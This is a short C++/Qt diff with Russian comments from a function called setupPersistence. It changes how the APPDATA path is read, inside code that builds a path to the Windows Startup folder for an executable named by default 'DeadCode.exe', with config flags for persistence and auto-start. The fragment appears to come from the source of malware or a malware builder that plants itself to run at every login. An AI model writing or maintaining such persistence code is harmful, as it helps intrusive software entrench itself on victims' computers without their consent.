@@ -1858,16 +1858,13 @@ void MainWindow::setupPersistence() {
 
     // Через Startup и реестр
     if (config.persist || config.autoStart) {
-        char* appDataPath = nullptr;
-        size_t len;
-        if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+        const char* appDataPath = std::getenv("APPDATA");
+        if (!appDataPath) {
             emitLog("Ошибка: Не удалось получить путь к APPDATA. Код ошибки: " + 
                     QString::number(errno));
-            free(appDataPath);
             return;
         }
         std::string appData(appDataPath);
-        free(appDataPath);
 
         std::string filename = config.filename.empty() ? "DeadCode.exe" : config.filename;
         std::string persistDir = appData + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
